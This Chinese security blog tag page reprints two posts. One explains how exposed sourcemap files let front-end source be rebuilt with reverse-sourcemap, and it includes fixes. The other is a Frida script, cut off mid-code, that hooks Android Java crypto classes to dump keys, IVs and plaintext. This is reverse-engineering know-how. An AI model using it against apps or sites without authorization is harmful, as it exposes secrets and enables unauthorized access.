<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>Tag: Exploit | 氕氘氚</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Open your eyes to see the light in life">
<meta property="og:type" content="website">
<meta property="og:title" content="氕氘氚">
<meta property="og:url" content="https://szczecin.github.io/tags/Exploit/index.html">
<meta property="og:site_name" content="氕氘氚">
<meta property="og:description" content="Open your eyes to see the light in life">
<meta property="og:locale">
<meta property="article:author" content="Szczecin">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        
  <section class="page-header tag">
    <h1>- <span>Exploit</span> -</h1>
  </section>






<section class="post-list">
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/06/13/SourceMap-Reverse/">
                sourcemap文件泄露漏洞
            </a>
        </h2>
    
    <time>
        Jun 13, 2024
    </time>
    <section class="content">
        <h1><span id="sourcemap文件泄露漏洞">sourcemap文件泄露漏洞</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/u011975363/article/details/125694154">小心灵呀</a> 并作补充</p>
<p>最近进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>时，时常遇到xray扫出sourcemap文件，每次扫到都要百度，因此做个笔记。</p>
</blockquote>
<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
<p>在日常测试时，经常会遇到以js.map为后缀的文件<br>这是jQuery中的一个新功能，支持Source Map<br>非常多Webpack打包的站点都会存在js.map文件.<br>通过sourcemap可还原前端代码找到API,间接性获取未授权访问漏洞</p>
<p>什么是Source map<br>简单说，Source map就是一个信息文件，里面储存着位置信息。转换后的代码的每一个位置，所对应的转换前的位置。<br>有了它，出错的时候，除错工具将直接显示原始代码，而不是转换后的代码,这无疑给开发者带来了很大方便。</p>
</blockquote>
<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
<p>使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xray&spm=1001.2101.3001.7020">xray</a>扫到 dirscan&#x2F;sourcemap&#x2F;default 漏洞。</p>
<p><img src="/2024/06/13/SourceMap-Reverse/1.png" alt="image"></p>
<p>直接访问链接可下在sourcemap文件，利用该文件还原源代码需使用reverse-sourcemap工具。<br>先安装：nodejs，<br>下载地址：<a target="_blank" rel="noopener" href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a><br>选择适合自己操作系统的版本：</p>
<p><img src="/2024/06/13/SourceMap-Reverse/2.png" alt="image"></p>
<p>双击下载后的文件，一路点击 next即可成功安装</p>
<p><img src="/2024/06/13/SourceMap-Reverse/3.png" alt="image"></p>
<p>安装完nodejs后，控制台输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure>

<p>即可查看安装的版本。</p>
<p><img src="/2024/06/13/SourceMap-Reverse/4.png" alt="image"></p>
<p>然后安装 reverse-sourcemap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --global reverse-sourcemap</span><br></pre></td></tr></table></figure>

<p>安装完成（PS：我电脑中已经有reverse-sourcemap，所以大家如果为初次安装看到信息可能跟我不一样）。</p>
<p><img src="/2024/06/13/SourceMap-Reverse/5.png" alt="image"></p>
<p>安装完成后，将其加入环境变量</p>
<p><img src="/2024/06/13/SourceMap-Reverse/6.png" alt="image"></p>
<p>检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse-sourcemap -h</span><br></pre></td></tr></table></figure>

<p>安装成功</p>
<p><img src="/2024/06/13/SourceMap-Reverse/7.png" alt="image"></p>
<p>还原map文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse-sourcemap -v ****.js.map -o output</span><br></pre></td></tr></table></figure>

<p>map文件会还原到 output文件</p>
<p>同时还可以通过浏览器，开发者模式-source模块查看前端源代码</p>
<p><img src="/2024/06/13/SourceMap-Reverse/8.png" alt="image"></p>
</blockquote>
<h2><span id="漏洞修复">漏洞修复</span></h2><blockquote>
<p>临时的解决方法就是删除代码目录下的.map文件；<br>永久的解决方法就是在build的时候禁用产生map文件的功能；<br>在scripts&#x2F;build下的build.js 文件中添加如下配置：<br>process.env.GENERATE_SOURCEMAP &#x3D; ‘false’;<br>重新build就不会再产生sourcemap文件了</p>
</blockquote>
<h2><span id="参考资料">参考资料</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1981398">如何还原前端代码</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Reverse/" rel="tag">Reverse</a><a class="tag-none-link" href="/tags/SourceMap/" rel="tag">SourceMap</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/05/24/Frida-Hook-Signature/">
                Frida java层自吐加密算法
            </a>
        </h2>
    
    <time>
        May 24, 2024
    </time>
    <section class="content">
        <h1><span id="frida-java层自吐加密算法">Frida java层自吐加密算法</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://kuizuo.cn/docs/frida-java-encryption-algorithm/">愧怍</a> 并作补充</p>
</blockquote>
<h2><span id="代码">代码</span></h2><blockquote>
<p>针对 java 层加密算法，能 hook 到 java 自带的加密函数库</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">showStacks</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">showDivider</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// console.log(&#x27;frida 已启动&#x27;);</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (config.<span class="property">showStacks</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Throwable&#x27;</span>).$new(name)))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">showDivider</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (config.<span class="property">showDivider</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`==============================<span class="subst">$&#123;name&#125;</span>==============================`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">showArguments</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;arguments: &#x27;</span>, ...<span class="variable language_">arguments</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.android.okhttp.okio.ByteString&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Encode</span> = &#123;</span><br><span class="line">    <span class="title function_">toBase64</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Base64: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">base64</span>())</span><br><span class="line">      <span class="comment">// console.log(tag + &#x27; Base64: &#x27;, bytesToBase64(data));</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">toHex</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Hex: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">hex</span>())</span><br><span class="line">      <span class="comment">// console.log(tag + &#x27; Hex: &#x27;, bytesToHex(data));</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">toUtf8</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Utf8: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">utf8</span>())</span><br><span class="line">      <span class="comment">// console.log(tag + &#x27; Utf8: &#x27;, bytesToString(data));</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">toAll</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">      <span class="title class_">Encode</span>.<span class="title function_">toUtf8</span>(tag, data)</span><br><span class="line">      <span class="title class_">Encode</span>.<span class="title function_">toHex</span>(tag, data)</span><br><span class="line">      <span class="title class_">Encode</span>.<span class="title function_">toBase64</span>(tag, data)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">toResult</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">      <span class="title class_">Encode</span>.<span class="title function_">toHex</span>(tag, data)</span><br><span class="line">      <span class="title class_">Encode</span>.<span class="title function_">toBase64</span>(tag, data)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">MessageDigest</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;java.security.MessageDigest&#x27;</span></span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> overloads_update = <span class="title class_">MessageDigest</span>.<span class="property">update</span>.<span class="property">overloads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_update) &#123;</span><br><span class="line">      overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> overloads_digest = <span class="title class_">MessageDigest</span>.<span class="property">digest</span>.<span class="property">overloads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_digest) &#123;</span><br><span class="line">      overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">digest</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> digest result`</span>, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Mac</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;javax.crypto.Mac&#x27;</span></span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">Mac</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key, AlgorithmParameterSpec</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(key, <span class="title class_">AlgorithmParameterSpec</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Mac</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.Key&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">      <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">      <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">      <span class="keyword">const</span> keyBytes = key.<span class="title function_">getEncoded</span>()</span><br><span class="line">      <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init Key`</span>, keyBytes)</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let overloads_update = Mac.update.overloads;</span></span><br><span class="line">    <span class="comment">// for (const overload of overloads_update) &#123;</span></span><br><span class="line">    <span class="comment">//   overload.implementation = function () &#123;</span></span><br><span class="line">    <span class="comment">//     const algorithm = this.getAlgorithm();</span></span><br><span class="line">    <span class="comment">//     showDivider(algorithm);</span></span><br><span class="line">    <span class="comment">//     showStacks(algorithm);</span></span><br><span class="line">    <span class="comment">//     Encode.toAll(`$&#123;algorithm&#125; update data`, arguments[0]);</span></span><br><span class="line">    <span class="comment">//     return this.update(...arguments);</span></span><br><span class="line">    <span class="comment">//   &#125;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> overloads_doFinal = <span class="title class_">Mac</span>.<span class="property">doFinal</span>.<span class="property">overloads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_doFinal) &#123;</span><br><span class="line">      overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> doFinal result`</span>, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Cipher</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;javax.crypto.Cipher&#x27;</span></span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> overloads_init = <span class="title class_">Cipher</span>.<span class="property">init</span>.<span class="property">overloads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_init) &#123;</span><br><span class="line">      overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">          <span class="keyword">const</span> mode = <span class="variable language_">arguments</span>[<span class="number">0</span>]</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init mode`</span>, mode)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">          <span class="keyword">const</span> className = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>])</span><br><span class="line">          <span class="comment">// 安卓10以上私钥是有可能输出不了的</span></span><br><span class="line">          <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;OpenSSLRSAPrivateKey&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// const keyBytes = arguments[1];</span></span><br><span class="line">            <span class="comment">// console.log(`$&#123;algorithm&#125; init key`, keyBytes);</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> keyBytes = <span class="variable language_">arguments</span>[<span class="number">1</span>].<span class="title function_">getEncoded</span>()</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init key`</span>, keyBytes)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">2</span>]) &#123;</span><br><span class="line">          <span class="keyword">const</span> className = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>])</span><br><span class="line">          <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> iv = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>], <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>))</span><br><span class="line">            <span class="keyword">const</span> ivBytes = iv.<span class="title function_">getIV</span>()</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init iv`</span>, ivBytes)</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;java.security.SecureRandom&#x27;</span>)) &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let overloads_update = Cipher.update.overloads;</span></span><br><span class="line">    <span class="comment">// for (const overload of overloads_update) &#123;</span></span><br><span class="line">    <span class="comment">//   overload.implementation = function () &#123;</span></span><br><span class="line">    <span class="comment">//     const algorithm = this.getAlgorithm();</span></span><br><span class="line">    <span class="comment">//     showDivider(algorithm);</span></span><br><span class="line">    <span class="comment">//     showStacks(algorithm);</span></span><br><span class="line">    <span class="comment">//     Encode.toAll(`$&#123;algorithm&#125; update data`, arguments[0]);</span></span><br><span class="line">    <span class="comment">//     return this.update(...arguments);</span></span><br><span class="line">    <span class="comment">//   &#125;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> overloads_doFinal = <span class="title class_">Cipher</span>.<span class="property">doFinal</span>.<span class="property">overloads</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_doFinal) &#123;</span><br><span class="line">      overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> doFinal result`</span>, result)</span><br><span class="line">        <span 